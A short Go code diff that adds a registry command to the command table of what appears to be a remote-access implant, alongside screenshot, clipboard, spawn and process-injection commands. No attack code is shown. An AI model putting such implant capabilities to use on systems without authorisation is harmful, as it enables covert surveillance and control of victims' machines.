@@ -21,6 +21,7 @@ func registerPlatformCommands() {
 	RegisterCommand(&ScreenshotCommand{})
 	RegisterCommand(&SpawnCommand{})
 	RegisterCommand(&OpusInjectionCommand{})
+	RegisterCommand(&RegCommand{})
 	RegisterCommand(&RegReadCommand{})
 	RegisterCommand(&RegWriteCommand{})
 	RegisterCommand(&ClipboardCommand{})
